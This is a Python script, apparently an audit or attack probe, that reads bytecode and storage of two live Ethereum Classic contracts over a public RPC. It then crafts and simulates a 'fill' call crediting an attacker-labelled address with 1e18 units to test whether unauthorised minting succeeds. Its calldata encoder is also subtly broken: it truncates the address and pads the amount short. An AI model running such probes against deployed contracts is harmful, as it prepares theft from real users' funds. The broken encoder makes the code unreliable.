import json, urllib.request
import pyevmasm as e
RPC="https://etc.etcdesktop.com"
def rpc(method, params):
    body=json.dumps({"jsonrpc":"2.0","method":method,"params":params,"id":1}).encode()
    req=urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json"})
    try: return json.load(urllib.request.urlopen(req, timeout=20))
    except Exception as ex: return {"error":str(ex)}
LED="0x180826b05452ce96e157f0708c43381fee64a6b8"
T="0x9f5304DA62A5408416Ea58A17a92611019bD5ce3"
ATK="1111111111111111111111111111111111111111"

code=rpc("eth_getCode",[LED,"latest"])["result"]
open("/workspace/audit/ledger_runtime.hex","w").write(code[2:])
print("LEDGER code bytes:", (len(code)-2)//2)

# read TARGET slot 9 (sealed flag is bit 0xa0)
s9=rpc("eth_getStorageAt",[T,hex(9),"latest"])["result"]
print("TARGET slot9 =", s9)
flag=(int(s9,16)>>160)&1
print("TARGET sealed flag (bit 160) =", flag)

# build fill(uint256[]) calldata properly
def enc_fill(addr, amt):
    sel="884b5dc2"
    offset="0"*62+"20"
    length="0"*62+"02"
    e0="0"*24+addr[2:].lower()
    e1="0"*48+format(amt,'x')
    return "0x"+sel+offset+length+e0+e1
data=enc_fill(ATK, 10**18)
print("calldata len (hex chars):", len(data)-2, "even?", (len(data)-2)%2==0)
for label,to in [("LEDGER",LED),("TARGET",T)]:
    r=rpc("eth_call",[{"from":"0x2222222222222222222222222222222222222222","to":to,"data":data,"gas":"0x7a1200"},"latest"])
    print(f"NAKLJUCNI -> {label}.fill([atk,1e18]) :", "OK "+r["result"] if "result" in r else "REVERT "+str(r.get("error")))
